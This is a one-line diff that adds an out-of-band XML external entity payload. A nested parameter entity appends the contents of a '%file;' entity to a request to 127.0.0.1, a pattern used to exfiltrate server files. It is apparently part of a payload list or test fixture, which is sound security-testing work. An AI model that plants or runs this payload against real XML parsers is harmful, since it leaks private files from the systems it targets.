@@ -1,0 +1,1 @@
+<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://127.0.0.1/%file;'>"> %all;
